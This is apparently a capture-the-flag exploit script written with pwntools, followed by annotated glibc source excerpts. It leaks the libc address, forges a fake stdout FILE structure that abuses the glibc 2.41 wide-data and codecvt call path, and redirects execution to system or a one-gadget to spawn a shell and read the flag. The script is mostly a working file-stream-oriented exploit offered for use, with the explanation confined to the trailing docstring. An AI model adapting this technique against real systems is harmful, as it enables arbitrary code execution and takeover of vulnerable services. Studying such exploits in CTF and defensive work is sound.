#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
b *vuln+65
# tbreak main
dir ./glibc-2.41/
set debug-file-directory ./dbg-symbols
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


ru(b'stdout : ')
libc_leak = int(rl().strip(), 16)
logleak(libc=libc_leak)

libc = ELF('./libc.so.6')
libc.address = libc_leak - 0x1e85c0
logleak(libcaddress=libc.address)

# b _IO_flush_all
# pause()


class File:
	def __init__(self) -> None:
		self.buf = bytearray(224)

	def write(self, offset, value):
		for i, b in enumerate(value):
			self.buf[offset+i] = b


stdout = libc.sym['_IO_2_1_stdout_']
_IO_stdfile_2_lock = stdout + 0x300
tocall = libc.sym.system
gadgets = [339395, 339412, 524367, 909123, 1028194, 1028202, 1028207, 1028215, 1028222]
tocall = libc.address + gadgets[int(args.X)] # system offset in libc 2.41

fp = File()
fp.write(0, b'\x01\x01\x01\x01') # _flags
fp.write(4, b';sh') # _flags
fp.write(8, p64(0)) # _IO_read_ptr;
fp.write(16, p64(0)) # _IO_read_end;
fp.write(24, p64(0)) # _IO_read_base;
fp.write(32, p64(0)) # _IO_write_base;
fp.write(40, p64(1)) # _IO_write_ptr;
fp.write(48, p64(2)) # _IO_write_end;
fp.write(56, p64(0)) # _IO_buf_base;
fp.write(64, p64(0)) # _IO_buf_end;
fp.write(72, p64(0)) # _IO_save_base;
fp.write(80, p64(0)) # _IO_backup_base;
fp.write(88, p64(0)) # _IO_save_end;
fp.write(96, p64(0)) # _markers
fp.write(104, p64(0)) # _chain
fp.write(112, p32(2)) # _fileno
fp.write(116, p32(0)) # _flags2
fp.write(120, p64(0xffffffffffffffff)) # _old_offset
fp.write(128, p16(0)) # _cur_column
fp.write(130, p8(0)) # _vtable_offset
fp.write(131, b'\x00' * 5)  # _shortbuf
fp.write(136, p64(_IO_stdfile_2_lock)) # _lock
fp.write(144, p64(0xffffffffffffffff)) # _offset
fp.write(152, p64(stdout+196+4-56)) # _codecvt; point to 196 after doing codecvt->__cd_out
fp.write(160, p64(stdout-0x10-0x28)) # _wide_data (wide vtable points before stdout so all its fields are shifted by -0x10)
fp.write(168, p64(0)) # _freeres_list
fp.write(176, p64(0)) # _freeres_buf
fp.write(184, p64(0)) # __pad5
fp.write(192, p32(1)) # _mode
fp.write(196, p32(0) 
         + p64(stdout+200-40+8) # codecvt->__cd_out.step
         + p64(tocall)) # _unused2, 4B padding, wide_vtable pointer and vtable entry for doallocate

s(fp.buf)

sl(b'cat flag*')

ia()


"""
int
_IO_cleanup (void)
{
  int result = _IO_flush_all ();

  _IO_unbuffer_all ();

  return result;
}

_IO_unbuffer_all (void)
{
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp; fp = fp->_chain)
    {
      int legacy = 0;

      run_fp = fp;
      _IO_flockfile (fp);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
      if (__glibc_unlikely (_IO_vtable_offset (fp) != 0))
	legacy = 1;
#endif

      /* Free up the backup area if it was ever allocated.  */
      if (_IO_have_backup (fp))
	_IO_free_backup_area (fp);
      if (!legacy && fp->_mode > 0 && _IO_have_wbackup (fp))
	_IO_free_wbackup_area (fp);

      if (! (fp->_flags & _IO_UNBUFFERED)
	  /* Iff stream is un-orientated, it wasn't used. */
	  && (legacy || fp->_mode != 0))
	{
	  if (! legacy && ! dealloc_buffers && !(fp->_flags & _IO_USER_BUF))
	    {
	      fp->_flags |= _IO_USER_BUF;

	      fp->_freeres_list = freeres_list;
	      freeres_list = fp;
	      fp->_freeres_buf = fp->_IO_buf_base;
	    }

	  _IO_SETBUF (fp, NULL, 0);

FILE *
_IO_new_file_setbuf (FILE *fp, char *p, ssize_t len)
{
  if (_IO_default_setbuf (fp, p, len) == NULL)
    return NULL;


FILE *
_IO_default_setbuf (FILE *fp, char *p, ssize_t len)
{
    if (_IO_SYNC (fp) == EOF)
	return NULL;

int
_IO_new_file_sync (FILE *fp)
{
  ssize_t delta;
  int retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_do_flush(fp)) return EOF;

#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
              


int
_IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;

  if (to_do > 0)
    {
      if (fp->_IO_write_end == fp->_IO_write_ptr
	  && fp->_IO_write_end != fp->_IO_write_base)
	{
	  if (_IO_new_do_write (fp, fp->_IO_write_base,
				fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
	    return WEOF;
	}

      do
	{
	  enum __codecvt_result result;
	  const wchar_t *new_data;
	  char mb_buf[MB_LEN_MAX];
	  char *write_base, *write_ptr, *buf_end;

	  if (fp->_IO_buf_end - fp->_IO_write_ptr < sizeof (mb_buf))
	    {
	      /* Make sure we have room for at least one multibyte
		 character.  */
	      write_ptr = write_base = mb_buf;
	      buf_end = mb_buf + sizeof (mb_buf);
	    }
	  else
	    {
	      write_ptr = fp->_IO_write_ptr;
	      write_base = fp->_IO_write_base;
	      buf_end = fp->_IO_buf_end;
	    }

	  /* Now convert from the internal format into the external buffer.  */
	  result = __libio_codecvt_out (cc, &fp->_wide_data->_IO_state,
					data, data + to_do, &new_data,
					write_ptr,
					buf_end,
					&write_ptr);
                         


enum __codecvt_result
__libio_codecvt_out (struct _IO_codecvt *codecvt, __mbstate_t *statep,
		     const wchar_t *from_start, const wchar_t *from_end,
		     const wchar_t **from_stop, char *to_start, char *to_end,
		     char **to_stop)
{
  enum __codecvt_result result;

  struct __gconv_step *gs = codecvt->__cd_out.step;
  int status;
  size_t dummy;
  const unsigned char *from_start_copy = (unsigned char *) from_start;

  codecvt->__cd_out.step_data.__outbuf = (unsigned char *) to_start;
  codecvt->__cd_out.step_data.__outbufend = (unsigned char *) to_end;
  codecvt->__cd_out.step_data.__statep = statep;

  __gconv_fct fct = gs->__fct;
  if (gs->__shlib_handle != NULL)
    PTR_DEMANGLE (fct);

  status = DL_CALL_FCT (fct,
			(gs, &codecvt->__cd_out.step_data, &from_start_copy,
			 (const unsigned char *) from_end, NULL,
			 &dummy, 0, 0));
                

pwndbg> ptype /o _IO_2_1_stdout_.file._codecvt
type = struct _IO_codecvt {
/*      0      |      56 */    _IO_iconv_t __cd_in;
/*     56      |      56 */    _IO_iconv_t __cd_out;

                               /* total size (bytes):  112 */
                             } *

pwndbg> ptype /o codecvt->__cd_out.step
type = struct __gconv_step {
/*      0      |       8 */    struct __gconv_loaded_object *__shlib_handle;
/*      8      |       8 */    const char *__modname;
/*     16      |       4 */    int __counter;
/* XXX  4-byte hole      */
/*     24      |       8 */    char *__from_name;
/*     32      |       8 */    char *__to_name;
/*     40      |       8 */    __gconv_fct __fct;
/*     48      |       8 */    __gconv_btowc_fct __btowc_fct;
/*     56      |       8 */    __gconv_init_fct __init_fct;
/*     64      |       8 */    __gconv_end_fct __end_fct;
/*     72      |       4 */    int __min_needed_from;
/*     76      |       4 */    int __max_needed_from;
/*     80      |       4 */    int __min_needed_to;
/*     84      |       4 */    int __max_needed_to;
/*     88      |       4 */    int __stateful;
/* XXX  4-byte hole      */
/*     96      |       8 */    void *__data;

                               /* total size (bytes):  104 */
                             } *
"""

